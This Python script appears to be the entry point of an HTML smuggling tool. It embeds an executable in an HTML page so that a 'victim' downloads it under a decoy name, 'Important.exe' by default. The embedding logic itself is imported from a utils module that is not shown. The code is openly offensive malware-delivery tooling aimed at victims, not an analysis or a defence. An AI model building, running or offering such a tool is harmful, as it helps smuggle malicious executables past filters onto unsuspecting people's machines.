import os
import sys
from utils import *
import argparse


def main():
    print_banner()

    # Argument parsing
    parser = argparse.ArgumentParser(description="HTTP Smuggling")
    parser.add_argument(
        "-o",
        "--output",
        required=False,
        default=os.path.join(os.getcwd(), "payload.html"),
        help="Output file (default=cwd + 'payload.html')",
    )
    parser.add_argument(
        "-i",
        "--input",
        required=True,
        help="Input file to embed in payload",
    )
    parser.add_argument(
        "-f",
        "--filename",
        required=False,
        default="Important.exe",
        help="Filename that will appear in browser and download folder of victim",
    )
    args = parser.parse_args()

    # Path to the executable to embed in the HTML file
    executable_path = args.input

    # Output HTML filename, default to 'payload.html' in the current directory if not provided
    output_html_path = args.output

    # Default filename the victim will see for the downloaded file, or use the provided one
    victim_download_filename = args.filename

    # Path to the template directory
    template_dir = os.path.join(os.path.dirname(__file__), "template")

    # Check if the template directory exists
    if not os.path.exists(template_dir):
        print(f"[!] Template directory '{template_dir}' not found.")
        sys.exit(1)

    # Ensure the necessary template files exist
    check_template_files(template_dir)

    # Generate the HTML file using the provided executable, output path, and victim's download filename
    generate_html(executable_path, output_html_path, victim_download_filename)

    print(f"[+] HTML file '{output_html_path}' generated successfully.")


if __name__ == "__main__":
    main()
